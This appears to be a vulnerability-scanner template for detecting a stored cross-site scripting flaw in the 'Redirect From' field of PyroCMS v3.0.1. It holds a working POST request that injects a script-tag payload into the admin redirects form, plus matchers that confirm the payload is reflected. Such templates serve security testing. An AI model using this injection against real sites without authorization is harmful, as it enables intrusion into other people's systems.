id: pyrocms-stored-xss

info:
  name: PyroCMS v3.0.1 Stored XSS
  author: tmrswrr
  severity: high
  description: |
    PyroCMS v3.0.1 is susceptible to a stored Cross-Site Scripting (XSS) vulnerability.
    An attacker can inject malicious code into the "Redirect From" field.
  tags: web, pyrocms, xss

requests:
  - method: POST
    path:
      - "{{BaseURL}}/public/admin/redirects/edit/1"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: |
      from=<script>alert('xss')</script>&to=/test&status=301&_token={{CSRF_Token}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<script>alert('xss')</script>"
        part: body

      - type: status
        status:
          - 200
